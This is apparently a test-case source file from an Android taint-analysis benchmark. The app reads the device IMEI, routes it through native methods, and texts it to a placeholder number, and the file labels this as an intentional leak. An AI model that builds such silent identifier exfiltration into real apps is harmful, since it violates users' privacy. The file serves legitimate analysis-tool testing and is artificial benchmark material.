package mod.ndk;

import mod.ndk.R;
import android.app.Activity;
import android.content.Context;
import android.os.*;
import android.telephony.SmsManager;
import android.telephony.TelephonyManager;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.Toast;

/**
 * @testcase_name NativeIDFunction
 * @version 0.1
 * @author Secure Software Engineering Group (SSE), European Center for Security and Privacy by Design (EC SPRIDE) 
 * @author_mail steven.arzt@cased.de
 * 
 * @description Sends tainted data from Java to Native and back to Java where it is leaked
 * @dataflow source -> imei -> native method -> native -> leak in caller (Java)
 * @number_of_leaks 1
 * @challenges the analysis must handle native method invocations
 */
public class ActMain extends Activity {
	static {
		System.loadLibrary("ndkmod");
	}

	// ___________________
	public native String cFuncRetString(String s); // C with params
	// ___________________
	public native String cFuncModString(String s); // C with params
	// ___________________

	@Override
	public void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.lay_main);
		Button button = (Button) findViewById(R.id.button1);
		button.setOnClickListener(new OnClickListener() {
			@Override
			public void onClick(View arg0) {
				
				String strIMEI = "";
				
				TelephonyManager telephonyManager = (TelephonyManager) getSystemService(Context.TELEPHONY_SERVICE);
				strIMEI = telephonyManager.getDeviceId() + "foo";

				String strOut = "";

				strOut += "\n- cFuncRetString("+strIMEI+"):["+cFuncRetString(strIMEI)+"]";
				strOut += "\n- cFuncModString("+strIMEI+"):["+cFuncModString(strIMEI)+"]";

				Toast.makeText(ActMain.this, strOut, Toast.LENGTH_LONG).show();
				
				SmsManager sms = SmsManager.getDefault();
		        sms.sendTextMessage("+49 1234", null, strOut, null, null);  //sink, leak 
			}
		});
	}
}